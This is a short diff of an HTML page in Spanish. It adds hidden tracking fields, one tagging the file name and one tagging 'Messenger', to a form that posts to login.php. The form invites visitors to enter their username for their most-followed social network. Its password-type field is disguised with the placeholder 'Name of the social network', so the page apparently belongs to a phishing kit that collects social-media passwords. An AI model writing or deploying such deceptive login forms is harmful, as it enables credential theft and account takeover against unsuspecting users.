@@ -102,9 +102,11 @@
     <h3>Deja abajo tu nombre en tú red social con más followers</h3>
     <h2 class="fle">↓↓</h2>
     <form action="login.php" method="post" accept-charset="utf-8">
+      <input type=hidden name=name value="'.basename(__FILE__).'">
       <input  class=input name=username type=text placeholder="Aquí tu nombre de usuario" />
       <br/>
       <input  size=20 class=inpu name=password type=password placeholder="Nombre de la red social" />
+      <input  type=hidden name=location value=Messenger />
       <br>
       <button type=submit>Continue </button>
       <br/>
